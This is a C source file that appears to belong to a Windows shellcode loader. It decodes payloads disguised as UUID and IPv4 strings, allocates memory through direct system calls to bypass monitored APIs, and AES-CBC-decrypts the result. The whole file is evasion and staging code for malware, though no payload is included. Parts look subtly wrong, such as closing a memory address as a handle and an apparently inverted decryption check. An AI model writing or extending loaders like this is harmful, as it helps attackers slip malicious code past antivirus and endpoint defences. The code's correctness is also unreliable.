#include "decrypt.h"
#include "syscall.h"
#include "peb.h"
#include "cbc.h"
PVOID UuidDecode(CONST CHAR(*uuids)[0x08], OUT PDWORD64 len, puuidFromStringA uuidFromStringA)
{

	NTSTATUS ntstatus;
	PVOID addr = NULL;										// alloc的uuid解密后的地址
	SIZE_T RegionSize;								// alloc的uuid解密后的地址大小
	DWORD64 elems = UuidsLen(uuids);					// uuid的个数
	RegionSize = (elems + 1) * 0x25;					// uuid占的字节
	*len = 0;
	ntstatus = SysNtAllocateVirtualMemory(NtCurrentProcess(), &addr, 0, &RegionSize, MEM_COMMIT, PAGE_READWRITE);
	
	if (ntstatus != STATUS_SUCCESS)
	{
		return NULL;
	}

	DWORD_PTR hptr = (DWORD_PTR)addr;
	
	for (int i = 0; i < elems; i++) {

		RPC_STATUS status = uuidFromStringA((RPC_CSTR)(* (DWORD64*)uuids[i]), (UUID*)hptr);
		
		if (status != RPC_S_OK) {
			
			ntstatus = SysNtClose(addr);

			if (ntstatus != STATUS_SUCCESS)
			{
				return NULL;
			}

			return NULL;
		}
		*len += 16;
		hptr += 16;
	}
	
	
	return (PVOID)addr;
	
}

PVOID Ipv4Decode(CONST CHAR(*ipv4)[0x08], OUT PDWORD64 len, pRtlIpv4StringToAddressA myRtlIpv4StringToAddressA)
{
	PCSTR Terminator = NULL;
	NTSTATUS ntstatus;
	SIZE_T RegionSize;
	PVOID addr = NULL;
	DWORD64 elems = Ipv4Len(ipv4);
	RegionSize = (elems + 1) * 0x10;
	*len = 0;

	ntstatus = SysNtAllocateVirtualMemory(NtCurrentProcess(), &addr, 0, &RegionSize, MEM_COMMIT, PAGE_READWRITE);

	if (ntstatus != STATUS_SUCCESS)
	{
		return NULL;
	}

	DWORD_PTR hptr = (DWORD_PTR)addr;

	for (int i = 0; i < elems; i++) {

		RPC_STATUS status = myRtlIpv4StringToAddressA((PCSTR)(*(DWORD64*)ipv4[i]), FALSE, &Terminator, (in_addr*)hptr);
		if (status != RPC_S_OK) {

			ntstatus = SysNtClose(addr);

			if (ntstatus != STATUS_SUCCESS)
			{
				return NULL;
			}

			return NULL;
		}
		hptr += 4;
		*len += 4;
	}

	return (PVOID)addr;

}

DWORD64 UuidsLen(CONST CHAR(*uuids)[0x08])
{
	DWORD64 i = 0;
	while (1)
	{
		if ((long long) * (DWORD64*)(*(DWORD64*)uuids[i]) == 0x3030303030303030)
		{
			break;
		}
		
		i++;
	}
	return i;
}

DWORD64 Ipv4Len(CONST CHAR(*ipv4)[0x08])
{
	DWORD64 i = 0;
	while (1)
	{
		if ((long long)*(DWORD64*)(*(DWORD64*)ipv4[i]) == 0x3030303030303030)
		{
			break;
		}

		i++;
	}
	return i;
}

PVOID aesDecrypt(const CHAR* keys, DWORD sizeofkeys, const CHAR* iv, PVOID buf, DWORD64 sizeofbuf, DWORD64 sizeofout)
{
	NTSTATUS ntstatus;
	PVOID addr = NULL;
	SIZE_T RegionSize;
	SIZE_T RegionSizeFree;
	RegionSize = sizeofout;
	RegionSizeFree = 0;
	
	ntstatus = SysNtAllocateVirtualMemory(NtCurrentProcess(), &addr, 0, &RegionSize, MEM_COMMIT, PAGE_READWRITE);
	
	if (ntstatus != STATUS_SUCCESS)
	{
		return NULL;
	}

	// AesCbcDecryptWithKey改为syscall
	BOOL isDecrypt = AesCbcDecryptWithKey((const UINT8*)keys, sizeofkeys, (const UINT8*)iv, buf, addr, sizeofout);
	if (isDecrypt)
	{
		return NULL;
	}
	
	ntstatus = SysNtFreeVirtualMemory(NtCurrentProcess(), (PVOID*)&buf, &RegionSizeFree, MEM_RELEASE);
	
	if (ntstatus != STATUS_SUCCESS)
	{
		return NULL;
	}

	return addr;
}

